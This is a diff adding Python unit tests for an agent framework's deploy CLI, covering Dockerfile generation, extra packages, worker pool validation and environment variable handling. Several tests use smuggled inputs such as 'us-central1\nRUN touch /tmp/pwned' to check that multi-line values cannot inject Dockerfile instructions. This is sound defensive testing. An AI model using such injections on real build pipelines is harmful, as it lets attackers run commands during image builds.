+  assert (tmp_dir / "my_helper.py").is_file()
+  dockerfile_content = (tmp_dir / "Dockerfile").read_text()
+  # File form: no trailing slash on either side of the COPY.
+  assert (
+      'COPY --chown=myuser:myuser "my_helper.py" "/app/my_helper.py"'
+      in dockerfile_content
+  )
+  assert '"my_helper.py/"' not in dockerfile_content
+  assert "my_helper.py" in captured[0]["source_packages"]
+
+
+def test_to_agent_engine_extra_packages_conflicting_name_raises(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """A package basename that collides with a reserved name raises."""
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  reserved_pkg = src_dir.parent / "Dockerfile"
+  reserved_pkg.mkdir()
+
+  with pytest.raises(click.ClickException) as exc_info:
+    cli_deploy.to_agent_engine(
+        agent_folder=str(src_dir),
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version="1.2.0",
+        extra_packages=[str(reserved_pkg)],
+    )
+
+  assert "conflicting name" in str(exc_info.value)
+
+
+def test_to_agent_engine_extra_packages_duplicate_basename_raises(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """Two extra packages that share a basename raise a ClickException."""
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  pkg_a = tmp_path / "a" / "shared"
+  pkg_b = tmp_path / "b" / "shared"
+  pkg_a.mkdir(parents=True)
+  pkg_b.mkdir(parents=True)
+
+  with pytest.raises(click.ClickException) as exc_info:
+    cli_deploy.to_agent_engine(
+        agent_folder=str(src_dir),
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version="1.2.0",
+        extra_packages=[str(pkg_a), str(pkg_b)],
+    )
+
+  assert "conflicting name" in str(exc_info.value)
+
+
+def test_to_agent_engine_extra_packages_dockerfile_keeps_inherited_pythonpath(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """The emitted PYTHONPATH prepends `/app` instead of discarding the old value."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  tmp_dir = src_dir.parent / "tmp"
+  extra_pkg = src_dir.parent / "my_extra_pkg"
+  extra_pkg.mkdir()
+  (extra_pkg / "helper.py").write_text("VALUE = 1\n")
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+      extra_packages=[str(extra_pkg)],
+  )
+
+  dockerfile_content = (tmp_dir / "Dockerfile").read_text()
+  assert [
+      line
+      for line in dockerfile_content.splitlines()
+      if line.startswith("ENV PYTHONPATH")
+  ] == ['ENV PYTHONPATH="/app:$PYTHONPATH"']
+
+
+def test_to_agent_engine_extra_packages_agents_name_raises(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """A package basename already staged in the build context raises."""
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  clashing_pkg = tmp_path / "outside" / "agents"
+  clashing_pkg.mkdir(parents=True)
+
+  with pytest.raises(click.ClickException) as exc_info:
+    cli_deploy.to_agent_engine(
+        agent_folder=str(src_dir),
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version="1.2.0",
+        extra_packages=[str(clashing_pkg)],
+    )
+
+  assert "conflicting name" in str(exc_info.value)
+
+
+def test_to_agent_engine_extra_packages_requirements_txt_is_not_clobbered(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """An extra package named requirements.txt leaves the agent's file intact."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  tmp_dir = src_dir.parent / "tmp"
+  extra_file = tmp_path / "outside" / "requirements.txt"
+  extra_file.parent.mkdir(parents=True)
+  extra_file.write_text("some-unrelated-package\n")
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+      extra_packages=[str(extra_file)],
+  )
+
+  assert (
+      "google-adk[a2a]=="
+      in (tmp_dir / "agents" / "agent" / "requirements.txt").read_text()
+  )
+  assert (tmp_dir / "requirements.txt").read_text() == (
+      "some-unrelated-package\n"
+  )
+
+
+def test_to_cloud_run_dockerfile_trigger_oidc_options(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """to_cloud_run includes trigger OIDC options in the generated Dockerfile CMD."""
+  src_dir = agent_dir(False, False)
+  temp_dir = tmp_path / "cloud_run_temp"
+  monkeypatch.setattr(
+      subprocess, "run", lambda *a, **k: mock.MagicMock(returncode=0)
+  )
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+  cli_deploy.to_cloud_run(
+      agent_folder=str(src_dir),
+      temp_folder=str(temp_dir),
+      project="my-project",
+      region="us-central1",
+      service_name="my-service",
+      app_name="my-app",
+      port=8000,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      adk_version="1.2.0",
+      log_level="INFO",
+      verbosity="INFO",
+      trigger_sources="pubsub,eventarc",
+      trigger_oidc_audience="https://my-service.run.app",
+      trigger_oidc_service_accounts="sa@project.iam.gserviceaccount.com",
+  )
+
+  dockerfile_content = (temp_dir / "Dockerfile").read_text()
+  assert "--trigger_sources=pubsub,eventarc" in dockerfile_content
+  assert (
+      "--trigger_oidc_audience=https://my-service.run.app" in dockerfile_content
+  )
+  assert (
+      "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com"
+      in dockerfile_content
+  )
+
+
+def test_to_gke_dockerfile_trigger_oidc_options(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """to_gke includes trigger OIDC options in the generated Dockerfile CMD."""
+  src_dir = agent_dir(False, False)
+  temp_dir = tmp_path / "gke_temp"
+  monkeypatch.setattr(
+      subprocess, "run", lambda *a, **k: mock.MagicMock(returncode=0)
+  )
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+  cli_deploy.to_gke(
+      agent_folder=str(src_dir),
+      temp_folder=str(temp_dir),
+      project="my-project",
+      region="us-central1",
+      cluster_name="my-cluster",
+      service_name="my-service",
+      app_name="my-app",
+      port=8000,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      adk_version="1.2.0",
+      log_level="INFO",
+      trigger_sources="pubsub,eventarc",
+      trigger_oidc_audience="https://my-service.run.app",
+      trigger_oidc_service_accounts="sa@project.iam.gserviceaccount.com",
+  )
+
+  dockerfile_content = (temp_dir / "Dockerfile").read_text()
+  assert "--trigger_sources=pubsub,eventarc" in dockerfile_content
+  assert (
+      "--trigger_oidc_audience=https://my-service.run.app" in dockerfile_content
+  )
+  assert (
+      "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com"
+      in dockerfile_content
+  )
+
+
+@pytest.mark.parametrize(
+    "adk_version, expect_flag",
+    [
+        ("2.1.0", False),
+        ("2.1.99", False),
+        ("2.2.0", True),
+        ("2.3.0", True),
+    ],
+)
+def test_to_agent_engine_gates_gemini_enterprise_flag_by_version(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    adk_version: str,
+    expect_flag: bool,
+) -> None:
+  """The api_server flag is only emitted for versions that accept it."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  tmp_dir = src_dir.parent / "tmp"
+
+  with mock.patch("click.secho") as mocked_secho:
+    cli_deploy.to_agent_engine(
+        agent_folder=str(src_dir),
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version=adk_version,
+    )
+
+  dockerfile = (tmp_dir / "Dockerfile").read_text()
+  assert ("--gemini_enterprise_app_name" in dockerfile) is expect_flag
+  warned = any(
+      "Omitting --gemini_enterprise_app_name" in call.args[0]
+      for call in mocked_secho.call_args_list
+  )
+  assert warned is not expect_flag
+
+
+def test_to_agent_engine_env_vars_override_reports_names_only(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """The env_vars override notice names the variables without their values."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  (src_dir / ".env").write_text(
+      'GOOGLE_API_KEY="secret-key-value"\nOTHER_VAR="other-secret-value"\n'
+  )
+  config_file = src_dir.parent / "config.json"
+  config_file.write_text(json.dumps({"env_vars": {"FROM_CONFIG": "kept"}}))
+
+  with mock.patch("click.echo") as mocked_echo:
+    cli_deploy.to_agent_engine(
+        agent_folder=str(src_dir),
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version="1.2.0",
+        agent_engine_config_file=str(config_file),
+    )
+
+  messages = [str(c[0][0]) for c in mocked_echo.call_args_list if c[0]]
+  assert not [m for m in messages if "secret-key-value" in m]
+  assert not [m for m in messages if "other-secret-value" in m]
+  override_messages = [m for m in messages if "Overriding env_vars" in m]
+  assert len(override_messages) == 1
+  assert "GOOGLE_API_KEY" in override_messages[0]
+  assert "OTHER_VAR" in override_messages[0]
+  # The values are still deployed, only the terminal output omits them.
+  assert captured[0]["env_vars"]["GOOGLE_API_KEY"] == "secret-key-value"
+
+
+# _robust_rmtree / _on_rm_error tests
+
+
+class TestRobustRmtree:
+  """Tests for the _robust_rmtree helper."""
+
+  def test_removes_directory_tree(self, tmp_path: Path) -> None:
+    """It should remove a normal directory tree."""
+    d = tmp_path / "subdir"
+    d.mkdir()
+    (d / "file.txt").write_text("hello")
+    cli_deploy._robust_rmtree(str(d))
+    assert not d.exists()
+
+  def test_removes_readonly_files(self, tmp_path: Path) -> None:
+    """It should remove a tree containing read-only files."""
+    import os
+    import stat
+
+    d = tmp_path / "ro_dir"
+    d.mkdir()
+    ro_file = d / "readonly.txt"
+    ro_file.write_text("locked")
+    ro_file.chmod(stat.S_IREAD)
+    cli_deploy._robust_rmtree(str(d))
+    assert not d.exists()
+
+  def test_on_rm_error_clears_readonly_and_retries(
+      self, tmp_path: Path
+  ) -> None:
+    """_on_rm_error should chmod the file and call the removal function."""
+    import os
+    import stat
+
+    ro_file = tmp_path / "locked.txt"
+    ro_file.write_text("data")
+    ro_file.chmod(stat.S_IREAD)
+
+    cli_deploy._on_rm_error(os.remove, str(ro_file), None)
+    assert not ro_file.exists()
+
+
+_VALID_WORKER_POOL = (
+    "projects/my-gcp-project/locations/us-central1/workerPools/my-private-pool"
+)
+
+
+def test_validate_worker_pool_accepts_full_resource_name() -> None:
+  """A well-formed Cloud Build worker pool resource name is accepted."""
+  assert cli_deploy._validate_worker_pool(_VALID_WORKER_POOL) == (
+      _VALID_WORKER_POOL
+  )
+
+
+@pytest.mark.parametrize(
+    "bad_pool",
+    [
+        "",
+        "   ",
+        "my-private-pool",
+        "projects/p/locations/l/workerPools/",
+        "projects/p/locations/l/pools/my-pool",
+        "projects/p/workerPools/my-pool",
+    ],
+)
+def test_validate_worker_pool_rejects_malformed_names(bad_pool: str) -> None:
+  """Malformed worker pool resource names raise a clear ClickException."""
+  with pytest.raises(click.ClickException):
+    cli_deploy._validate_worker_pool(bad_pool)
+
+
+def test_apply_worker_pool_nests_cli_value_into_build_config() -> None:
+  """CLI worker_pool is nested under build_config for the Vertex SDK."""
+  agent_config: Dict[str, Any] = {}
+  cli_deploy._apply_worker_pool_to_agent_config(
+      agent_config, _VALID_WORKER_POOL
+  )
+  assert agent_config["build_config"]["worker_pool"] == _VALID_WORKER_POOL
+  assert "worker_pool" not in agent_config
+
+
+def test_apply_worker_pool_pops_top_level_config_key() -> None:
+  """Top-level worker_pool in .agent_engine_config.json is nested and removed."""
+  agent_config: Dict[str, Any] = {"worker_pool": _VALID_WORKER_POOL}
+  cli_deploy._apply_worker_pool_to_agent_config(agent_config, None)
+  assert agent_config["build_config"]["worker_pool"] == _VALID_WORKER_POOL
+  assert "worker_pool" not in agent_config
+
+
+def test_apply_worker_pool_cli_overrides_config_file() -> None:
+  """Explicit CLI worker_pool overrides values from the config file."""
+  override = "projects/other/locations/europe-west1/workerPools/compliance-pool"
+  agent_config: Dict[str, Any] = {
+      "build_config": {"worker_pool": _VALID_WORKER_POOL},
+  }
+  cli_deploy._apply_worker_pool_to_agent_config(agent_config, override)
+  assert agent_config["build_config"]["worker_pool"] == override
+
+
+def test_apply_worker_pool_preserves_other_build_config_fields() -> None:
+  """Existing build_config.service_account is kept when adding worker_pool."""
+  agent_config: Dict[str, Any] = {
+      "build_config": {
+          "service_account": "builder@example.iam.gserviceaccount.com",
+      },
+  }
+  cli_deploy._apply_worker_pool_to_agent_config(
+      agent_config, _VALID_WORKER_POOL
+  )
+  assert agent_config["build_config"] == {
+      "service_account": "builder@example.iam.gserviceaccount.com",
+      "worker_pool": _VALID_WORKER_POOL,
+  }
+
+
+def test_to_agent_engine_forwards_worker_pool_in_update_config(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """to_agent_engine puts worker_pool under build_config on agent_engines.update."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+      worker_pool=_VALID_WORKER_POOL,
+  )
+
+  assert len(captured) == 1
+  assert captured[0]["build_config"]["worker_pool"] == _VALID_WORKER_POOL
+
+
+def test_to_agent_engine_reads_worker_pool_from_config_file(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """worker_pool from .agent_engine_config.json is forwarded on deploy."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  (src_dir / ".agent_engine_config.json").write_text(
+      json.dumps({"worker_pool": _VALID_WORKER_POOL})
+  )
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+  )
+
+  assert captured[0]["build_config"]["worker_pool"] == _VALID_WORKER_POOL
+  assert "worker_pool" not in captured[0]
+
+
+def test_to_agent_engine_rejects_invalid_worker_pool(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """An invalid --worker_pool value fails before calling Agent Engine APIs."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+
+  with pytest.raises(click.ClickException) as exc_info:
+    cli_deploy.to_agent_engine(
+        agent_folder=str(src_dir),
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version="1.2.0",
+        worker_pool="not-a-resource-name",
+    )
+
+  assert "Invalid worker_pool" in str(exc_info.value)
+  assert captured == []
+
+
+def test_cli_deploy_agent_engine_passes_worker_pool(tmp_path: Path) -> None:
+  """--worker_pool reaches to_agent_engine as a keyword argument."""
+  agent_dir = tmp_path / "my_agent"
+  agent_dir.mkdir()
+  runner = CliRunner()
+  with mock.patch(
+      "src.google.adk.cli.cli_deploy.to_agent_engine"
+  ) as mock_to_agent_engine:
+    result = runner.invoke(
+        cli_tools_click.main,
+        [
+            "deploy",
+            "agent_engine",
+            f"--worker_pool={_VALID_WORKER_POOL}",
+            str(agent_dir),
+        ],
+        catch_exceptions=False,
+    )
+    assert result.exit_code == 0
+    mock_to_agent_engine.assert_called_once()
+    _, kwargs = mock_to_agent_engine.call_args
+    assert kwargs["worker_pool"] == _VALID_WORKER_POOL
+
+
+def _adk_app_template() -> type:
+  """Returns the Agent Platform template the class-method catalogue mirrors."""
+  agent_engines = pytest.importorskip(
+      "vertexai.agent_engines",
+      reason="Agent Platform deployment is an optional extra.",
+  )
+  return agent_engines.AdkApp
+
+
+def test_agent_engine_class_methods_match_the_template_operations() -> None:
+  """The deployed resource advertises the operations the template registers."""
+  adk_app_template = _adk_app_template()
+  # register_operations reads nothing off the instance, so call it unbound.
+  # Constructing the template would resolve Application Default Credentials,
+  # which a unit test must not depend on.
+  operations = adk_app_template.register_operations(None)
+
+  declared = {
+      (method["name"], method["api_mode"])
+      for method in cli_deploy._AGENT_ENGINE_CLASS_METHODS
+  }
+  registered = {
+      (name, api_mode)
+      for api_mode, names in operations.items()
+      for name in names
+  }
+
+  assert declared == registered
+
+
+def test_agent_engine_class_method_parameters_match_the_template() -> None:
+  """Every catalogue schema names what the template's method accepts."""
+  adk_app_template = _adk_app_template()
+
+  for method in cli_deploy._AGENT_ENGINE_CLASS_METHODS:
+    signature = inspect.signature(getattr(adk_app_template, method["name"]))
+    named = {
+        name: parameter
+        for name, parameter in signature.parameters.items()
+        if name != "self"
+        and parameter.kind
+        not in (parameter.VAR_POSITIONAL, parameter.VAR_KEYWORD)
+    }
+    absorbs_extras = any(
+        parameter.kind is parameter.VAR_KEYWORD
+        for parameter in signature.parameters.values()
+    )
+    declared = method["parameters"]["properties"]
+
+    assert not set(named) - set(declared), method["name"]
+    if not absorbs_extras:
+      assert not set(declared) - set(named), method["name"]
+    assert sorted(method["parameters"]["required"]) == sorted(
+        name
+        for name, parameter in named.items()
+        if parameter.default is parameter.empty
+    ), method["name"]
+
+
+def test_to_agent_engine_sets_gcp_project_and_enterprise_env(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """Tests that to_agent_engine configures GCP project and enterprise env vars."""
+  update_config: Dict[str, Any] = {}
+  fake_vertexai = types.ModuleType("vertexai")
+
+  class _FakeAgentEngines:
+
+    def create(self, **kwargs: Any) -> Any:
+      return types.SimpleNamespace(
+          api_resource=types.SimpleNamespace(
+              name="projects/p/locations/l/reasoningEngines/e"
+          )
+      )
+
+    def update(self, *, name: str, config: Dict[str, Any]) -> None:
+      del name
+      nonlocal update_config
+      update_config = config
+
+  class _FakeVertexClient:
+
+    def __init__(self, *args: Any, **kwargs: Any) -> None:
+      del args
+      del kwargs
+      self.agent_engines = _FakeAgentEngines()
+
+  fake_vertexai.Client = _FakeVertexClient
+  monkeypatch.setitem(sys.modules, "vertexai", fake_vertexai)
+
+  dockerfile_content = None
+  orig_rmtree = shutil.rmtree
+
+  def mock_rmtree(path: Any, *args: Any, **kwargs: Any) -> None:
+    nonlocal dockerfile_content
+    df = Path(path) / "Dockerfile"
+    if df.exists():
+      dockerfile_content = df.read_text()
+    orig_rmtree(path, *args, **kwargs)
+
+  monkeypatch.setattr(shutil, "rmtree", mock_rmtree)
+
+  src_dir = agent_dir(True, False)
+  tmp_dir = src_dir.parent / "tmp"
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder=str(tmp_dir),
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+  )
+
+  env_vars = update_config.get("env_vars") or {}
+  has_enterprise = (
+      "ENV GOOGLE_GENAI_USE_ENTERPRISE=1" in (dockerfile_content or "")
+      or env_vars.get("GOOGLE_GENAI_USE_ENTERPRISE") == "1"
+  )
+  assert (
+      has_enterprise
+  ), "GOOGLE_GENAI_USE_ENTERPRISE=1 must be set in Dockerfile or env_vars"
+
+  has_project = (
+      "ENV GOOGLE_CLOUD_PROJECT=my-gcp-project" in (dockerfile_content or "")
+      or env_vars.get("GOOGLE_CLOUD_PROJECT") == "my-gcp-project"
+  )
+  assert (
+      has_project
+  ), "GOOGLE_CLOUD_PROJECT=my-gcp-project must be set in Dockerfile or env_vars"
+
+  has_location = (
+      "ENV GOOGLE_CLOUD_LOCATION=us-central1" in (dockerfile_content or "")
+      or env_vars.get("GOOGLE_CLOUD_LOCATION") == "us-central1"
+  )
+  assert (
+      has_location
+  ), "GOOGLE_CLOUD_LOCATION=us-central1 must be set in Dockerfile or env_vars"
+
+
+@pytest.mark.parametrize(
+    "value", ["1", "true", "us-central1", "example.com:my-project", "", None]
+)
+def test_validate_dockerfile_env_value_accepts_single_line_values(
+    value: Any,
+) -> None:
+  """Ordinary values, including domain-scoped project ids, are accepted."""
+  cli_deploy._validate_dockerfile_env_value("GOOGLE_CLOUD_PROJECT", value)
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "us-central1\nRUN touch /tmp/pwned",
+        "us-central1\r\nRUN touch /tmp/pwned",
+        "us-central1\n",
+        "\nRUN touch /tmp/pwned",
+    ],
+)
+def test_validate_dockerfile_env_value_rejects_multiline_values(
+    value: str,
+) -> None:
+  """A value spanning more than one line is rejected by name, not by value."""
+  with pytest.raises(click.ClickException) as exc_info:
+    cli_deploy._validate_dockerfile_env_value("GOOGLE_CLOUD_LOCATION", value)
+  assert "GOOGLE_CLOUD_LOCATION" in str(exc_info.value)
+  assert "RUN touch" not in str(exc_info.value)
+
+
+@pytest.mark.parametrize(
+    "env_name",
+    [
+        "GOOGLE_GENAI_USE_ENTERPRISE",
+        "GOOGLE_CLOUD_PROJECT",
+        "GOOGLE_CLOUD_LOCATION",
+    ],
+)
+def test_to_agent_engine_rejects_multiline_env_file_value(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    env_name: str,
+) -> None:
+  """A multi-line `.env` value must not add instructions to the Dockerfile."""
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+  # An unset gcloud default project is what lets the .env project win.
+  monkeypatch.setattr(
+      subprocess, "run", lambda *a, **k: types.SimpleNamespace(stdout="\n")
+  )
+  created: List[Any] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai([], created)
+  )
+
+  src_dir = agent_dir(False, False)
+  tmp_dir = src_dir.parent / "tmp"
+  (src_dir / ".env").write_text(f'{env_name}="1\nRUN touch /tmp/pwned"\n')
+
+  with pytest.raises(click.ClickException) as exc_info:
+    cli_deploy.to_agent_engine(
+        agent_folder=str(src_dir),
+        temp_folder="tmp",
+        project=None if env_name == "GOOGLE_CLOUD_PROJECT" else "my-project",
+        region=None if env_name == "GOOGLE_CLOUD_LOCATION" else "us-central1",
+        adk_version="1.2.0",
+    )
+
+  assert env_name in str(exc_info.value)
+  assert "RUN touch" not in str(exc_info.value)
+  assert not (tmp_dir / "Dockerfile").exists()
+  assert not created, "rejecting the value must not leak an agent engine"
+
+
+def test_to_gke_without_region_passes_valid_subprocess_args(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """Tests that to_gke passes valid non-None arguments to subprocess commands when region is None."""
+  import os
+
+  src_dir = agent_dir(False, False)
+
+  def fake_run(cmd: Any, *args: Any, **kwargs: Any) -> Any:
+    for arg in cmd:
+      if not isinstance(arg, (str, bytes, os.PathLike)):
+        raise TypeError(
+            "expected str, bytes or os.PathLike object, not"
+            f" {type(arg).__name__}"
+        )
+    return types.SimpleNamespace(
+        stdout="deployment.apps/gke-svc created\nservice/gke-svc created"
+    )
+
+  monkeypatch.setattr(subprocess, "run", fake_run)
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+  cli_deploy.to_gke(
+      agent_folder=str(src_dir),
+      project="gke-proj",
+      region=None,
+      cluster_name="my-gke-cluster",
+      service_name="gke-svc",
+      app_name="agent",
+      temp_folder=str(tmp_path),
+      port=9090,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      log_level="debug",
+      adk_version="1.2.0",
+  )
